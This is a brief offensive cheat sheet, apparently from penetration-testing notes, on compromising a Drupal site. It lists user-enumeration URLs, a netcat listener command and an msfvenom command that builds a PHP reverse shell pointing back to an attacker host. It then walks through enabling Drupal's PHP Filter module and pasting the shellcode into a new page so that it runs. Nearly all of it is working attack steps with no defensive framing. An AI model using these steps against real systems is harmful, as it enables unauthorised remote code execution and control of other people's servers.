### User enum
```
<domain>/user/register
```

### Get number of existing user
```
/users/<number>
```

### Start listener
```
nc -lvp <lport>
```

### Create php reverse shell
```
msfvenom -p php/reverse_php lhost=<lhost> lport=<lport> -f raw
```

### Insert PHP code into Drupal
```
/modules/php
Modules > (Check) PHP Filter > Save configuration
Modules > PHP filter Permsissions > Check Use th PHP code text format for Administrator > Save permissions
Content > Add content > Basic Page > Write php shellcode on the body > Text format: PHP code > Preview
```

